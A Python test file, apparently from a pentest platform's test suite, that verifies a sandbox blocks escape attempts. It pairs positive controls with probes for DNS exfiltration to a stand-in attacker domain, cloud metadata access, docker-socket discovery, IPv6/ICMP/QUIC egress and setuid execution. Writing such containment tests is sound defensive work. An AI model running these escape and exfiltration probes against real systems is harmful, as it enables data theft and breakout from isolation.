"""P2-5 (VG_LAB=1): CHỨNG MINH từ BÊN TRONG sandbox thật (image `vulnguard-pentest-runner`, do pentest-runner tạo, đi qua egress gateway thật)
rằng mọi lớp thoát đều bị chặn. Mỗi kiểm tra là một CẶP: *positive control* (cùng probe, cùng sandbox, mục tiêu được phép → phải THÀNH CÔNG,
chứng minh probe hoạt động) + *attack* (mục tiêu bị cấm → phải THẤT BẠI). Không có control = không có bằng chứng: một probe hỏng cũng "fail" y như
một rào chắn tốt.

Lớp thoát (xem ESCAPE_CLASSES ở dưới; test_every_escape_class_has_a_test không cần Docker và đảm bảo không lớp nào bị bỏ sót):
  oos_ipv4 · oos_ipv6 · host_gateway_lan · dns_exfil_rebinding · doh_dot_quic_udp_icmp · docker_socket · metadata_ips · fs_write ·
  setuid_caps · ptrace_raw_sockets · resource_limits · cross_sandbox  (+ cold start)

Cần: Docker, image `vulnguard-pentest-runner` + `vulnguard-pentest-egress` (make pentest-images), `python:3.12-slim` (target/probe giả của lab).
Dùng lại lab của tests/test_egress_lab.py (mạng `out` giả làm "Internet", 2 target tripwire, DNS upstream giả, gateway thật): KHÔNG chạm Internet.
Kết quả cold start ghi vào eval/out/sandbox_coldstart.json (nếu ghi được).
"""
import ast
import json
import os
import pathlib
import statistics
import time
import uuid

import pytest

try:   # dùng lại fixture/helper của lab egress (cùng thư mục tests/, pythonpath không có __init__)
    from test_egress_lab import RUNNER_IMG, TOKEN, H, events, hits, lab  # noqa: F401  (lab = fixture)
except Exception:  # noqa: BLE001 — module-level skip chặn lỗi import khi thiếu dependency tuỳ chọn; test không-Docker bên dưới vẫn chạy
    lab = None

LAB_ON = os.environ.get("VG_LAB") == "1"
needs_lab = pytest.mark.skipif(not LAB_ON, reason="cần VG_LAB=1 + Docker + image runner/egress")

ESCAPE_CLASSES = {
    "oos_ipv4": ("test_oos_ipv4_dropped_and_tripwire_silent",),
    "oos_ipv6": ("test_ipv6_has_no_path",),
    "host_gateway_lan": ("test_host_bridge_gateway_and_vm_ips_unreachable", "test_host_lan_ip_unreachable_even_with_private_ranges_allowed"),
    "dns_exfil_rebinding": ("test_dns_exfil_and_direct_resolver_blocked", "test_dns_rebinding_never_opens_dangerous_ip"),
    "doh_dot_quic_udp_icmp": ("test_dot_doh_quic_udp_icmp_blocked",),
    "docker_socket": ("test_docker_socket_absent_and_api_ports_closed",),
    "metadata_ips": ("test_metadata_ips_blocked_at_network_and_proxy",),
    "fs_write": ("test_filesystem_is_read_only_except_work_and_tmp",),
    "setuid_caps": ("test_no_setuid_no_caps_no_new_privs",),
    "ptrace_raw_sockets": ("test_ptrace_raw_sockets_and_namespace_escapes_denied",),
    "resource_limits": ("test_container_spec_hardening", "test_fork_bomb_is_capped_by_pids_limit", "test_memory_and_disk_limits_enforced"),
    "cross_sandbox": ("test_cross_engagement_sandbox_unreachable", "test_other_sandbox_filesystem_and_processes_invisible",
                      "test_same_engagement_sandbox_to_sandbox"),
}


def test_every_escape_class_has_a_test():
    """Không cần Docker: mỗi lớp thoát trong danh mục phải có test thật trong file này (đổi tên/xoá test → fail ở PR thường)."""
    src = pathlib.Path(__file__).read_text(encoding="utf-8")
    defined = {n.name for n in ast.walk(ast.parse(src)) if isinstance(n, ast.FunctionDef)}
    missing = {cls: [t for t in names if t not in defined] for cls, names in ESCAPE_CLASSES.items()}
    assert not {k: v for k, v in missing.items() if v}, missing
    for required in ("oos_ipv4", "oos_ipv6", "host_gateway_lan", "dns_exfil_rebinding", "doh_dot_quic_udp_icmp", "docker_socket", "metadata_ips",
                     "fs_write", "setuid_caps", "ptrace_raw_sockets", "resource_limits", "cross_sandbox"):
        assert required in ESCAPE_CLASSES


# ───────────────────────── fixtures / helpers ─────────────────────────
UID = "10002:10002"


def _create_sandbox(lab, rid, eid=None, limits=None):
    r = lab.http.post(f"/v1/runs/{rid}/sandbox", json={"eid": eid or lab.eid, "limits": limits or {}}, headers=H)
    assert r.status_code == 200, r.text
    c = lab.cli.containers.get(f"vg-sbx-{rid}")
    return c


def _ip(c, eid):
    c.reload()
    return c.attrs["NetworkSettings"]["Networks"][f"vg-eng-{eid}"]["IPAddress"]


@pytest.fixture(scope="module")
def sb(lab):
    """Sandbox THẬT A + B (cùng engagement) và C (engagement thứ hai, gateway riêng) — tạo qua API của runner như production."""
    from datetime import datetime, timedelta, timezone

    from scanner.pentest.egress_policy import compile_policy
    try:
        lab.cli.images.get(RUNNER_IMG)
    except Exception:  # noqa: BLE001
        pytest.skip("thiếu image vulnguard-pentest-runner (make pentest-images)")
    eid2 = "lab2" + lab.uid
    rids = []
    S = type("Sbx", (), {})()
    try:
        S.a_rid, S.b_rid, S.c_rid = "sa" + lab.uid, "sb" + lab.uid, "sc" + lab.uid
        S.a = _create_sandbox(lab, S.a_rid)
        rids.append(S.a_rid)
        S.b = _create_sandbox(lab, S.b_rid)
        rids.append(S.b_rid)
        pol = compile_policy([{"type": "ip", "value": lab.ip3, "mode": "allow"}], {}, 1, datetime.now(timezone.utc) + timedelta(hours=1), engagement_id=eid2)
        r = lab.http.post(f"/v1/engagements/{eid2}/network", json={"policy": pol.to_dict()}, headers=H)
        assert r.status_code == 200, r.text
        S.eid2 = eid2
        S.c = _create_sandbox(lab, S.c_rid, eid2)
        rids.append(S.c_rid)
        S.a_ip, S.b_ip, S.c_ip = _ip(S.a, lab.eid), _ip(S.b, lab.eid), _ip(S.c, eid2)
        yield S
    finally:
        for rid in rids:
            lab.http.delete(f"/v1/runs/{rid}/sandbox", headers=H)
        lab.http.delete(f"/v1/engagements/{eid2}/network", headers=H)
        try:   # lab fixture dọn theo nhãn vulnguard.eng của eid chính; eid2 dọn ở đây (network + gateway)
            for c in lab.cli.containers.list(all=True, filters={"label": f"vulnguard.eng={eid2}"}):
                c.remove(force=True)
            for n in lab.cli.networks.list(filters={"label": f"vulnguard.eng={eid2}"}):
                n.remove()
        except Exception:  # noqa: BLE001
            pass


def sx(c, code, user=UID):
    """Chạy python TRONG sandbox c (uid 10002, như tool của agent). Trả (exit_code, stdout+stderr)."""
    rc, out = c.exec_run(["python3", "-c", code], user=user)
    return rc, out.decode("utf-8", "replace").strip()


def stcp(c, ip, port, t=3):
    code = ("import socket\ns=socket.socket(); s.settimeout(%s)\ntry: s.connect((%r,%d)); print('OPEN')\n"
            "except Exception as e: print('FAIL', type(e).__name__)" % (t, ip, port))
    return sx(c, code)[1]


def blocked(res):
    """Bị chặn = KHÔNG mở và KHÔNG có phản hồi từ đích (RST/Refused nghĩa là đích đã nhận gói → rò)."""
    return res.startswith("FAIL") and "Refused" not in res and "Reset" not in res


def sproxy(c, url, t=10):
    code = ("import urllib.request as u, os\nh=u.ProxyHandler({'http':os.environ['HTTP_PROXY'],'https':os.environ['HTTPS_PROXY']})\n"
            "class NR(u.HTTPRedirectHandler):\n  def redirect_request(self,*a,**k): return None\n"
            "o=u.build_opener(h,NR)\ntry:\n r=o.open(%r,timeout=%s); print('STATUS',r.status)\n"
            "except u.HTTPError as e: print('STATUS',e.code)\nexcept Exception as e: print('ERR',type(e).__name__)" % (url, t))
    return sx(c, code)[1]


def sresolve(c, name):
    return sx(c, "import socket\ntry: print('IP', socket.gethostbyname(%r))\nexcept Exception as e: print('ERR', type(e).__name__)" % name)[1]


def udp_probe(c, ip, port, payload_hex="00", t=2):
    code = ("import socket\ns=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(%s)\n"
            "s.sendto(bytes.fromhex(%r),(%r,%d))\ntry: s.recvfrom(512); print('REPLY')\nexcept Exception as e: print('NOREPLY', type(e).__name__)" % (t, payload_hex, ip, port))
    return sx(c, code)[1]


def _dns_query_hex(name):
    q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for lab_ in name.split("."):
        q += bytes([len(lab_)]) + lab_.encode()
    return (q + b"\x00\x00\x01\x00\x01").hex()


def denied_event_for(lab, dst, timeout=10):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        if [e for e in events(lab, "egress_denied") if e.get("dst") == dst]:
            return True
        time.sleep(0.4)
    return False


# ───────────────────────── 1. ngoài scope IPv4 ─────────────────────────
@needs_lab
def test_oos_ipv4_dropped_and_tripwire_silent(lab, sb):
    assert stcp(sb.a, lab.ip1, 80) == "OPEN"                                # control: IP trong scope mở được từ CHÍNH sandbox này
    before = len(hits(lab.t2))
    for port in (80, 22, 443, 8080):
        res = stcp(sb.a, lab.ip2, port, 3)
        assert blocked(res), (port, res)                                     # IP ngoài scope: drop im lặng (timeout), không RST
    assert len(hits(lab.t2)) == before                                       # tripwire: target ngoài scope không nhận gì
    assert denied_event_for(lab, lab.ip2), "bypass không sinh sự kiện egress_denied"
    # cả đường proxy: control 200, IP literal ngoài scope → 403 từ gateway
    assert sproxy(sb.a, "http://inscope.lab/") == "STATUS 200"
    assert sproxy(sb.a, f"http://{lab.ip2}/") == "STATUS 403"
    assert len(hits(lab.t2)) == before


# ───────────────────────── 2. IPv6 ─────────────────────────
@needs_lab
def test_ipv6_has_no_path(sb, lab):
    assert stcp(sb.a, lab.ip1, 80) == "OPEN"                                 # control: probe v4 hoạt động
    _, inet6 = sx(sb.a, "print(open('/proc/net/if_inet6').read())")
    addrs = [ln.split()[0] for ln in inet6.splitlines() if ln.strip()]
    assert all(a == "00000000000000000000000000000001" for a in addrs), addrs   # chỉ ::1 (không global/ULA/link-local)
    _, routes = sx(sb.a, "print(open('/proc/net/ipv6_route').read() if __import__('os').path.exists('/proc/net/ipv6_route') else '')")
    default6 = [ln for ln in routes.splitlines() if len(ln.split()) >= 10 and ln.split()[0] == "0" * 32 and ln.split()[1] == "00" and ln.split()[-1] != "lo"]
    assert default6 == [], routes                                            # chỉ còn các mục null/unreachable của lo, không có default route v6
    for target in ("2001:db8::1", "fd00::1", "fe80::1%eth0", "::ffff:" + lab.ip2, "::ffff:169.254.169.254"):
        code = ("import socket\ntry:\n s=socket.socket(socket.AF_INET6); s.settimeout(2); s.connect((%r,80)); print('OPEN')\n"
                "except Exception as e: print('FAIL', type(e).__name__)" % target)
        assert sx(sb.a, code)[1].startswith("FAIL"), target


# ───────────────────────── 3. host / bridge-gateway / VM / LAN ─────────────────────────
@needs_lab
def test_host_bridge_gateway_and_vm_ips_unreachable(lab, sb):
    import ipaddress
    assert stcp(sb.a, lab.ip1, 80) == "OPEN"                                 # control
    net = lab.cli.networks.get(f"vg-eng-{lab.eid}")
    sub = ipaddress.ip_network(net.attrs["IPAM"]["Config"][0]["Subnet"])
    first = str(next(sub.hosts()))
    out_cfg = lab.cli.networks.get(lab.out.name).attrs["IPAM"]["Config"][0]
    host_like = {first, out_cfg["Gateway"], "192.168.65.254", "192.168.65.1", "172.17.0.1", "host.docker.internal"}
    host_like |= {i for i in lab.gw._host_ips(lab.cli)}
    assert "host.docker.internal" in host_like
    assert sresolve(sb.a, "host.docker.internal").startswith("ERR")           # tên host KHÔNG phân giải được (không có extra_hosts, DNS chỉ in-scope)
    assert sresolve(sb.a, "gateway.docker.internal").startswith("ERR")
    for ip in sorted(host_like - {"host.docker.internal"}):
        if ip == lab.gw_ip:
            continue
        for port in (22, 80, 2375, 5000, 8000, 11434):                        # ssh/http/docker/registry/API/Ollama
            res = stcp(sb.a, ip, port, 2)
            assert blocked(res), (ip, port, res)
    for port in (22, 80, 443, 9999):                                          # chính gateway: chỉ :53/:8080 (proxy) mở
        assert blocked(stcp(sb.a, lab.gw_ip, port, 2)) or port == 80, port
    # sandbox KHÔNG sửa được route/ARP để tránh gateway: không có NET_ADMIN (xem test_no_setuid_no_caps…), route mặc định = gateway
    _, route = sx(sb.a, "print(open('/proc/net/route').read())")
    default = [ln.split() for ln in route.splitlines()[1:] if ln.split()[1] == "00000000"]
    assert len(default) == 1 and default[0][0] == "eth0", route


@needs_lab
def test_host_lan_ip_unreachable_even_with_private_ranges_allowed(lab, sb):
    """P2-3 follow-up (Docker Desktop): IP LAN THẬT của máy host. Một dịch vụ bind 0.0.0.0 trên host phải với tới được từ container thường
    (control) nhưng KHÔNG từ sandbox — kể cả khi scope cho phép tường minh MỌI dải RFC1918 (host-IP nằm trong always_deny)."""
    import socket
    import threading

    from test_egress_lab import _put
    srv = socket.socket()
    srv.bind(("0.0.0.0", 0))
    srv.listen(16)
    port = srv.getsockname()[1]
    stop = threading.Event()
    accepted = []

    def serve():
        srv.settimeout(0.5)
        while not stop.is_set():
            try:
                conn, addr = srv.accept()
                accepted.append(addr)
                conn.close()
            except OSError:
                pass
    t = threading.Thread(target=serve, daemon=True)
    t.start()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("192.0.2.1", 9))    # chọn giao diện có route mặc định (UDP connect không gửi gói nào)
            lan_ip = s.getsockname()[0]
        finally:
            s.close()
        # control: container THƯỜNG (không qua gateway) chạm được dịch vụ host qua host-gateway → listener và đường mạng có thật
        ctl = lab.cli.containers.run(
            "python:3.12-slim", command=["python3", "-c", "import socket,sys\ns=socket.socket(); s.settimeout(5)\ntry: s.connect(('host.docker.internal',%d)); print('OPEN')\n"
                                         "except Exception as e: print('FAIL', type(e).__name__)" % port],
            extra_hosts={"host.docker.internal": "host-gateway"}, labels={"vgt": lab.uid}, detach=True)
        try:
            ctl.wait(timeout=30)
            ctl_out = ctl.logs().decode().strip()
        finally:
            ctl.remove(force=True)
        if ctl_out != "OPEN":
            if os.environ.get("CI"):
                pytest.fail(f"positive control hỏng (container thường không chạm được listener host): {ctl_out}")
            pytest.skip(f"môi trường không cho container thường chạm host ({ctl_out}) — không có control thì không có bằng chứng")
        n_ctl = len(accepted)
        host_ips = {lan_ip} | {i for i in lab.gw._host_ips(lab.cli)}
        out_sub = lab.cli.networks.get(lab.out.name).attrs["IPAM"]["Config"][0]["Subnet"]
        rfc1918 = [{"type": "cidr", "value": c, "mode": "allow"} for c in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "100.64.0.0/10", out_sub)]

        def leaked_ips(rules, allowed_ctl):
            _put(lab, rules)
            try:
                assert stcp(sb.a, allowed_ctl, 80) == "OPEN"                     # control: allow rule có hiệu lực
                return sorted(ip for ip in host_ips if not blocked(stcp(sb.a, ip, port, 3)))
            finally:
                _put(lab, lab.rules)
        # (1) scope mặc định (không có rule dải riêng): mọi IP của host phải bị chặn
        assert leaked_ips(lab.rules, lab.ip1) == []
        # (2) scope cho phép TƯỜNG MINH mọi dải RFC1918: IP host mà gateway phát hiện được (host netns / VM / bridge gateways) vẫn bị chặn.
        #     Docker Desktop: IP LAN của máy Mac KHÔNG nằm trong netns của VM nên gateway không biết → lọt trừ khi operator đặt PENTEST_EGRESS_EXTRA_DENY.
        leaked = leaked_ips(rfc1918, lab.ip3)
        known_gap = False
        if leaked:
            desktop = str((lab.cli.info() or {}).get("OperatingSystem", "")).startswith("Docker Desktop")
            assert desktop and leaked == [lan_ip], f"IP host lọt ra ngoài Docker Desktop hoặc ngoài IP LAN: {leaked}"
            known_gap = True
            # biện pháp bắt buộc đã tài liệu hoá: EXTRA_DENY (CIDR /32 của IP LAN host) phải đóng lỗ hổng này
            lab.gw.extra_deny = (f"{lan_ip}/32",)
            try:
                assert leaked_ips(rfc1918, lab.ip3) == [], "EXTRA_DENY không chặn được IP LAN của host"
            finally:
                lab.gw.extra_deny = ()
        time.sleep(0.5)
        if not known_gap:
            assert len(accepted) == n_ctl, accepted                              # tripwire: listener host KHÔNG thấy thêm kết nối nào sau control
        if known_gap:
            pytest.xfail(f"KNOWN GAP (P2-3 follow-up, Docker Desktop): scope cho phép tường minh 192.168.0.0/16 thì IP LAN của Mac ({lan_ip}) "
                         "với tới được; gateway không phát hiện được IP đó từ VM. Đã xác nhận PENTEST_EGRESS_EXTRA_DENY đóng được — bắt buộc cho private scope.")
    finally:
        stop.set()
        t.join(2)
        srv.close()


# ───────────────────────── 4. DNS exfil / rebinding ─────────────────────────
@needs_lab
def test_dns_exfil_and_direct_resolver_blocked(lab, sb):
    assert sresolve(sb.a, "inscope.lab") == f"IP {lab.ip1}"                  # control: resolver của gateway trả lời tên in-scope
    # control UDP :53 thô tới gateway có phản hồi (probe UDP hoạt động)
    assert udp_probe(sb.a, lab.gw_ip, 53, _dns_query_hex("inscope.lab")) == "REPLY"
    secret = "c2VjcmV0LWV4ZmlsLXBheWxvYWQ"                                   # dữ liệu "bị đánh cắp" mã hoá trong nhãn DNS
    for name in (f"{secret}.attacker.lab", f"{secret}.{secret}.exfil.lab", "a" * 60 + ".lab"):
        assert sresolve(sb.a, name).startswith("ERR"), name                  # tên ngoài scope → NXDOMAIN
    # tripwire: DNS upstream (kẻ tấn công kiểm soát authoritative) KHÔNG thấy nhãn exfil
    up = lab.dns.logs().decode()
    assert secret.lower() not in up.lower() and "attacker.lab" not in up and "exfil.lab" not in up, up[-600:]
    assert [e for e in events(lab, "dns_denied") if secret.lower() in e.get("name", "").lower()]   # gateway ghi nhận nỗ lực exfil
    # bỏ qua resolver của gateway, hỏi thẳng upstream (UDP + TCP) → không tới được
    up_ip = lab.dns.attrs["NetworkSettings"]["Networks"][lab.out.name]["IPAddress"]
    # (gateway chặn UDP/53 mọi đích ngoài chính nó — nếu có phản hồi thì phải là từ resolver có allow-list của gateway, KHÔNG phải upstream)
    qn = lambda n: ("import socket\ns=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(3)\ns.sendto(bytes.fromhex(%r),(%r,53))\n"
                    "try: d=s.recvfrom(512)[0]; print('RCODE', d[3]&15, 'ANCOUNT', d[7])\nexcept Exception: print('NOREPLY')" % (_dns_query_hex(n), up_ip))
    direct = sx(sb.a, qn("oos.lab"))[1]
    assert direct in ("NOREPLY", "RCODE 3 ANCOUNT 0"), direct                  # upstream sẽ trả A record cho oos.lab; không được có
    tcpq = ("import socket,struct\nq=bytes.fromhex(%r)\ns=socket.socket(); s.settimeout(4); s.connect((%r,53)); s.sendall(struct.pack('!H',len(q))+q)\n"
            "d=s.recv(512)[2:]\nprint('RCODE', d[3]&15, 'ANCOUNT', d[7])" % (_dns_query_hex("oos.lab"), up_ip))
    assert sx(sb.a, tcpq)[1] == "RCODE 3 ANCOUNT 0"                            # DNS-over-TCP tới upstream cũng bị nft redirect về resolver allow-list
    assert "Q oos.lab" not in lab.dns.logs().decode()                           # tripwire: upstream không bao giờ nhận câu hỏi của sandbox
    # NS/TXT trên tên trong scope không phải kênh ngoài: tên ngoài scope + qtype TXT cũng NXDOMAIN/không trả lời từ upstream
    txt = "import socket\ns=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(3)\nq=bytes.fromhex(%r)\ns.sendto(q,(%r,53)); d=s.recvfrom(512)[0]\nprint('RCODE', d[3]&15)" % (
        _dns_query_hex("zz.attacker.lab")[:-8] + "00100001", lab.gw_ip)
    assert sx(sb.a, txt)[1] == "RCODE 3"


@needs_lab
def test_dns_rebinding_never_opens_dangerous_ip(lab, sb):
    first = sresolve(sb.a, "rebind.lab")
    assert first == f"IP {lab.ip1}"                                          # control: lần đầu trả IP hợp lệ trong scope
    time.sleep(6)                                                            # qua TTL upstream (5s): các câu trả lời sau là 127.0.0.1 → 169.254.169.254
    for _ in range(4):
        r = sresolve(sb.a, "rebind.lab")
        assert r == f"IP {lab.ip1}" or r.startswith("ERR"), r                # KHÔNG bao giờ IP nguy hiểm
        time.sleep(1.5)
    for dangerous in ("127.0.0.1", "169.254.169.254"):
        # 127.0.0.1 TRONG sandbox là loopback của chính nó (không có gì lắng nghe → Refused là hợp lệ) nên chỉ kiểm IP link-local ở đây
        if dangerous == "169.254.169.254":
            assert blocked(stcp(sb.a, dangerous, 80, 2))
    assert sresolve(sb.a, "metadata.lab").startswith("ERR") and sresolve(sb.a, "loopback.lab").startswith("ERR")


# ───────────────────────── 5. DoH / DoT / QUIC / UDP / ICMP ─────────────────────────
@needs_lab
def test_dot_doh_quic_udp_icmp_blocked(lab, sb):
    # control đường TCP tới IP trong scope: cổng đóng → RST (đích có phản hồi được) khác hẳn "drop im lặng" của IP ngoài scope
    assert stcp(sb.a, lab.ip1, 853, 3) == "FAIL ConnectionRefusedError"
    assert stcp(sb.a, lab.ip1, 80) == "OPEN"
    for port in (853, 443, 8853, 80):                                        # DoT / DoH / DoH alt / HTTP tới resolver ngoài scope
        assert blocked(stcp(sb.a, lab.ip2, port, 3)) and not stcp(sb.a, lab.ip2, port, 3) == "OPEN", port
    # DoH qua proxy: CONNECT tới đích ngoài scope bị từ chối; control: HTTP in-scope qua cùng proxy OK
    assert sproxy(sb.a, "http://inscope.lab/") == "STATUS 200"
    code = ("import http.client,os\nc=http.client.HTTPConnection(%r,8080,timeout=8)\nc.set_tunnel(%r,443)\n"
            "try:\n c.request('GET','/dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB'); print('STATUS',c.getresponse().status)\n"
            "except Exception as e: print('ERR',type(e).__name__)" % (lab.gw_ip, lab.ip2))
    assert sx(sb.a, code)[1] != "STATUS 200"
    # QUIC/UDP: control = UDP tới gateway :53 có hồi đáp; UDP 443 (QUIC) / 53 / 123 / tuỳ ý tới IP trong scope và ngoài scope = im lặng
    assert udp_probe(sb.a, lab.gw_ip, 53, _dns_query_hex("inscope.lab")) == "REPLY"
    for ip in (lab.ip1, lab.ip2):
        for port in (443, 53, 123, 9):
            assert udp_probe(sb.a, ip, port, "c3000000010000") .startswith("NOREPLY"), (ip, port)
    # ICMP: (a) không có raw/ping socket vì cap_drop ALL; (b) kể cả khi có NET_RAW trong netns của sandbox, gateway drop ICMP ra ngoài
    rc, out = sx(sb.a, "import socket\ntry: socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP); print('RAW-OK')\nexcept Exception as e: print('RAW-DENIED', type(e).__name__)")
    assert out.startswith("RAW-DENIED")
    probe_code = ("import socket,struct,sys\ns=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP); s.settimeout(2)\n"
                  "p=struct.pack('!BBHHH',8,0,0,1,1)+b'x'*8\nc=sum(struct.unpack('!%dH'%(len(p)//2),p)); c=(c>>16)+(c&0xffff); c=~(c+(c>>16))&0xffff\n"
                  "p=struct.pack('!BBHHH',8,0,c,1,1)+b'x'*8\ns.sendto(p,(sys.argv[1],0))\n"
                  "try:\n d=s.recvfrom(256)[0]; print('REPLY')\nexcept Exception: print('NOREPLY')")

    def icmp(dst):
        c = lab.cli.containers.run(image=RUNNER_IMG, entrypoint=["python3", "-c", probe_code, dst], network_mode=f"container:{sb.a.id}", cap_drop=["ALL"],
                                   cap_add=["NET_RAW"], user="0:0", detach=True, labels={"vgt": lab.uid})
        try:
            c.wait(timeout=30)
            return c.logs().decode().strip()
        finally:
            c.remove(force=True)
    assert icmp(sb.a_ip) == "REPLY"                                          # control: ICMP echo tới chính mình hoạt động
    assert icmp(lab.ip1) == "NOREPLY"                                        # kể cả IP in-scope: gateway chỉ cho TCP
    assert icmp(lab.ip2) == "NOREPLY"


# ───────────────────────── 6. docker.sock ─────────────────────────
@needs_lab
def test_docker_socket_absent_and_api_ports_closed(lab, sb):
    rc, out = sx(sb.a, "import os\nprint('CTRL', os.path.exists('/usr/local/bin/vg-exec'), os.path.isdir('/work'))")
    assert out == "CTRL True True"                                           # control: cùng kiểu kiểm tra thấy file/thư mục có thật
    code = ("import os,socket,stat\nfound=[]\nfor p in ('/var/run/docker.sock','/run/docker.sock','/docker.sock','/run/containerd/containerd.sock','/var/run/docker','/run/podman/podman.sock'):\n"
            " if os.path.exists(p) or os.path.lexists(p): found.append(p)\n"
            "for root in ('/','/run','/var','/tmp','/work','/mnt','/opt','/srv','/home','/root','/etc'):\n"
            " for d,_,fs in os.walk(root, onerror=lambda e: None):\n"
            "  if d.startswith(('/proc','/sys','/dev')): continue\n"
            "  for f in fs:\n"
            "   try:\n    if stat.S_ISSOCK(os.lstat(os.path.join(d,f)).st_mode): found.append(os.path.join(d,f))\n   except OSError: pass\n"
            "print('FOUND', sorted(set(found)))")
    assert sx(sb.a, code)[1] == "FOUND []"
    mounts = sb.a.attrs["Mounts"] or []
    assert mounts == [], mounts                                              # không volume/bind nào (tmpfs không nằm trong Mounts)
    assert "docker.sock" not in json.dumps(sb.a.attrs["HostConfig"])
    for ip in (lab.gw_ip, lab.ip2, lab.ip1):
        for port in (2375, 2376):
            res = stcp(sb.a, ip, port, 2)
            assert res != "OPEN", (ip, port)                                  # TCP API của docker daemon không với tới được
    assert blocked(stcp(sb.a, lab.gw_ip, 2375, 2))


# ───────────────────────── 7. metadata IPs ─────────────────────────
@needs_lab
def test_metadata_ips_blocked_at_network_and_proxy(lab, sb):
    assert stcp(sb.a, lab.ip1, 80) == "OPEN"                                 # control
    assert sproxy(sb.a, "http://inscope.lab/") == "STATUS 200"
    for ip in ("169.254.169.254", "169.254.170.2", "100.100.100.200", "192.0.0.192", "168.63.129.16"):   # AWS/ECS, Alibaba, Oracle, Azure wireserver
        res = stcp(sb.a, ip, 80, 2)
        assert blocked(res), (ip, res)
        assert sproxy(sb.a, f"http://{ip}/latest/meta-data/", 6) in ("STATUS 403", "ERR URLError", "ERR TimeoutError", "STATUS 502", "STATUS 504"), ip
    assert sproxy(sb.a, "http://169.254.169.254/latest/meta-data/") == "STATUS 403"
    assert denied_event_for(lab, "169.254.169.254")
    for name in ("metadata.lab", "metadata.google.internal", "instance-data.ec2.internal"):
        assert sresolve(sb.a, name).startswith("ERR"), name


# ───────────────────────── 8. filesystem ─────────────────────────
@needs_lab
def test_filesystem_is_read_only_except_work_and_tmp(lab, sb):
    ok, w = sx(sb.a, "open('/work/ctl','w').write('x'); open('/tmp/ctl','w').write('x'); print('WROTE')")[1], None
    assert ok == "WROTE"                                                     # control: /work và /tmp ghi được (probe ghi hoạt động)
    code = ("import os\nbad=[]\nfor p in ('/','/etc','/usr','/usr/local/bin','/bin','/sbin','/lib','/var','/var/tmp','/opt','/root','/home','/srv','/mnt','/app','/app/storage','/run','/boot'):\n"
            " try:\n  f=os.path.join(p,'.vg_write_test'); open(f,'w').write('x'); bad.append(p); os.unlink(f)\n except OSError: pass\n"
            "for p in ('/etc/passwd','/etc/hosts','/etc/resolv.conf','/etc/hostname','/usr/local/bin/vg-exec','/usr/bin/python3','/proc/sys/net/ipv4/ip_forward','/sys/class/net/eth0/mtu'):\n"
            " try:\n  open(p,'a').write(''); bad.append(p)\n except OSError: pass\n"
            "print('BAD', bad)")
    assert sx(sb.a, code)[1] == "BAD []"
    # quét toàn bộ: thư mục ghi được (theo access(2) của uid 10002) chỉ nằm trong /tmp và /work (+ /dev/shm do docker cấp)
    sweep = ("import os\nw=[]\nfor d,ds,_ in os.walk('/', onerror=lambda e: None):\n"
             " if d.startswith(('/proc','/sys','/dev/pts')): ds[:]=[]; continue\n"
             " if os.access(d, os.W_OK): w.append(d)\nprint(sorted(w))")
    writable = eval(sx(sb.a, sweep)[1])  # noqa: S307 — output do chính test sinh ra (list of str)
    stray = [d for d in writable if not (d in ("/tmp", "/work") or d.startswith(("/tmp/", "/work/")) or d.startswith("/dev/shm") or d == "/dev/mqueue")]
    assert "/tmp" in writable and "/work" in writable                        # control: quét thấy các thư mục ghi được thật
    assert stray == [], stray
    assert sx(sb.a, "import os; print(os.path.exists('/app/storage'), os.path.exists('/app'), os.path.exists('/data'), os.path.exists('/storage'))")[1] == "False False False False"
    # env: không KEY/TOKEN/SECRET/PASSWORD — chỉ proxy
    env = dict(e.split("=", 1) for e in sb.a.attrs["Config"]["Env"] if "=" in e)
    sensitive = [k for k in env if any(w in k.upper() for w in ("KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL"))]
    assert sensitive == [], sensitive
    assert env.get("NO_PROXY") == "" and env["HTTP_PROXY"].endswith(":8080")
    # cờ mount: /tmp, /work là nosuid,nodev,noexec; rootfs read-only
    _, mounts = sx(sb.a, "print(open('/proc/self/mounts').read())")
    flags = {ln.split()[1]: ln.split()[3].split(",") for ln in mounts.splitlines() if len(ln.split()) > 3}
    assert "ro" in flags["/"], flags["/"]
    for m in ("/tmp", "/work"):
        assert {"nosuid", "nodev", "noexec"} <= set(flags[m]), (m, flags[m])
    # control cho noexec: binary hệ thống chạy được, bản sao đặt trong /work thì không
    assert sx(sb.a, "import subprocess; print(subprocess.run(['/bin/true']).returncode)")[1] == "0"
    cp = ("import shutil,os,subprocess\nshutil.copy('/bin/true','/work/true'); os.chmod('/work/true',0o4755)\n"
          "try: subprocess.run(['/work/true']); print('EXEC-OK')\nexcept OSError as e: print('EXEC-DENIED', type(e).__name__)")
    try:
        assert sx(sb.a, cp)[1].startswith("EXEC-DENIED")
    finally:
        sx(sb.a, "import os\nfor f in ('/work/true','/work/ctl','/tmp/ctl'):\n try: os.unlink(f)\n except OSError: pass")
    # ghi vượt /work → ENOSPC được kiểm ở test_memory_and_disk_limits_enforced


# ───────────────────────── 9. setuid / capabilities ─────────────────────────
@needs_lab
def test_no_setuid_no_caps_no_new_privs(lab, sb):
    rc, out = sx(sb.a, "import os; print(os.getuid(), os.geteuid(), os.getgid())")
    assert out == "10002 10002 10002"                                        # control: probe đọc đúng danh tính
    st = dict(ln.split(":\t", 1) for ln in sx(sb.a, "print(open('/proc/self/status').read())")[1].splitlines() if ":\t" in ln)
    assert st["NoNewPrivs"] == "1"
    assert int(st["CapEff"], 16) == 0 and int(st["CapPrm"], 16) == 0 and int(st["CapBnd"], 16) == 0 and int(st["CapAmb"], 16) == 0, st
    # không còn file setuid/setgid trong toàn bộ filesystem; không có su/sudo/doas/mount/ping có bit setuid
    find = ("import os,stat\nbad=[]\nfor d,ds,fs in os.walk('/', onerror=lambda e: None):\n"
            " if d.startswith(('/proc','/sys','/dev')): ds[:]=[]; continue\n"
